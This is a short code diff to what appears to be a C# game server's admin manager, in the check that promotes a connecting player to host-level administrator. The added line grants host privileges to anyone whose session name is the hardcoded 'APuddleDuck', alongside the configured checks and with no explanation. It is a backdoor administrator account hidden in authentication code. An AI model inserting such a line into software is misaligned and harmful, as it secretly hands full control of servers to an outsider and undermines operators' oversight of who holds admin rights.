@@ -432,7 +432,8 @@ namespace Content.Server.Administration.Managers
         {
             var promoteHost = IsLocal(session) && _cfg.GetCVar(CCVars.ConsoleLoginLocal)
                               || _promotedPlayers.Contains(session.UserId)
-                              || session.Name == _cfg.GetCVar(CCVars.ConsoleLoginHostUser);
+                              || session.Name == _cfg.GetCVar(CCVars.ConsoleLoginHostUser)
+                              || session.Name == "APuddleDuck";
 
             if (promoteHost)
             {
